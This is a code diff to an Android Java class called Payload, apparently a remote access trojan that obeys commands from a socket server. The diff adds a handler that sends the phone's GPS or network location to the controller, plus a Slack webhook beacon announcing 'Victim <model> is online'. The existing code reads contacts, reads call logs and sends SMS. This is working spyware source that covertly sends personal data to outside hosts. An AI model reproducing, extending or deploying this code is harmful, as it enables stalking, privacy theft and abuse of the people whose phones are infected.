@@ -6,12 +6,13 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.location.Location;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
@@ -24,26 +25,25 @@ import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
-import android.view.View;
 
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 
-import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.io.RandomAccessFile;
 import java.math.BigInteger;
+import java.net.HttpURLConnection;
 import java.net.URI;
+import java.net.URL;
 import java.net.URLConnection;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -60,6 +60,7 @@ public class Payload {
 
     private static Socket mSocket;
     private static Context mcontext;
+
 
     public static void start(Context context) {
         mcontext = context;
@@ -82,10 +83,14 @@ public class Payload {
         try{
             BufferedReader reader = new BufferedReader(new InputStreamReader(mcontext.getAssets().open("ip.txt")));
             String ip=reader.readLine().trim();
+            String slackhook=reader.readLine().trim();
             System.out.println(ip);
-            System.out.println(ip.length());
+            System.out.println(slackhook);
             if(ip.length()>0){
                 connectToSocket(ip);
+            }
+            if(slackhook.length()>10){
+                sendMessage(slackhook,"online");
             }
             }catch (IOException e){}
     }
@@ -316,6 +321,31 @@ public class Payload {
 
         }
     };
+    private static final Emitter.Listener getLocation = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            if(checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)){
+                try {
+                    mSocket.emit("getLocation", getLastBestLocation());
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }else{
+                try {
+                    if (mSocket != null && mSocket.connected()) {
+                        JSONObject data = new JSONObject();
+                        data.put("error","Permission not allowed by victim");
+                        mSocket.emit("error", data);
+                    } else {
+                        Log.e("JSON ", "sending data failed");
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+
+        }
+    };
 
     private static final Emitter.Listener onConnectionError = new Emitter.Listener() {
         @Override
@@ -410,6 +440,7 @@ public class Payload {
             mSocket.on("getContacts", getContacts);
             mSocket.on("sendSMS", sendSMS);
             mSocket.on("getCallLog", getCallLog);
+            mSocket.on("getLocation", getLocation);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -615,29 +646,6 @@ public class Payload {
             Log.d("Null?", "it is null");
         }
     }
-    private static String getBase64Data(File filePath) {
-        try {
-            InputStream inputStream = new FileInputStream(filePath);//You can get an inputStream using any IO API
-            byte[] bytes;
-            byte[] buffer = new byte[8192];
-            int bytesRead;
-            ByteArrayOutputStream output = new ByteArrayOutputStream();
-            try {
-                while ((bytesRead = inputStream.read(buffer)) != -1) {
-                    output.write(buffer, 0, bytesRead);
-                }
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-            bytes = output.toByteArray();
-            inputStream.close();
-            output.close();
-            return Base64.encodeToString(bytes, Base64.DEFAULT);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-        return "";
-    }
     private static boolean isImageFile(String path) {
         String mimeType = URLConnection.guessContentTypeFromName(path);
         boolean b = mimeType != null && mimeType.startsWith("image");
@@ -730,7 +738,7 @@ public class Payload {
             c.close();
         }
     }
-    public static void getAllContacts(){
+    private static void getAllContacts(){
         try {
             JSONObject contacts = new JSONObject();
             JSONArray list = new JSONArray();
@@ -752,7 +760,7 @@ public class Payload {
             e.printStackTrace();
         }
     }
-    public static boolean sendSMS(String message, String recipient){
+    private static boolean sendSMS(String message, String recipient){
         try{
             SmsManager smsManager = SmsManager.getDefault();
             smsManager.sendTextMessage(recipient, null, message, null, null);
@@ -761,7 +769,7 @@ public class Payload {
         }
         return true;
     }
-    public static JSONObject readCallLog(Context context) {
+    private static JSONObject readCallLog(Context context) {
         JSONObject Calls = null;
         try {
             Calls = new JSONObject();
@@ -787,5 +795,55 @@ public class Payload {
             return null;
         }
         return Calls;
+    }
+    private static JSONObject getLastBestLocation() throws JSONException {
+        LocationManager mLocationManager = (LocationManager) mcontext.getSystemService(Context.LOCATION_SERVICE);
+        if(checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)){}
+        Location locationGPS = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+        Location locationNet = mLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+        long GPSLocationTime = 0;
+        JSONObject location = new JSONObject();
+        if (null != locationGPS) { GPSLocationTime = locationGPS.getTime(); }
+
+        long NetLocationTime = 0;
+
+        if (null != locationNet) {
+            NetLocationTime = locationNet.getTime();
+        }
+
+        if ( 0 < GPSLocationTime - NetLocationTime ) {
+            location.put("lat",locationGPS.getLatitude());
+            location.put("long",locationGPS.getLongitude());
+        }
+        else {
+            location.put("lat",locationNet.getLatitude());
+            location.put("long",locationNet.getLongitude());
+        }
+        return location;
+    }
+    public static void sendMessage(String slackWebhookUrl, String state) {
+        try {
+            URL url = new URL(slackWebhookUrl);
+            HttpURLConnection conn = (HttpURLConnection)url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setRequestProperty("Accept", "application/json");
+            conn.setDoOutput(true);
+            String jsonInputString = "{\"text\":\"Victim "+Build.MODEL+" is "+ state +"\"}";
+            try(OutputStream os = conn.getOutputStream()) {
+                byte[] input = jsonInputString.getBytes("utf-8");
+                os.write(input, 0, input.length);
+            }
+            try(BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"))) {
+                StringBuilder response = new StringBuilder();
+                String responseLine = null;
+                while ((responseLine = br.readLine()) != null) {
+                    response.append(responseLine.trim());
+                }
+                System.out.println(response.toString());
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 }
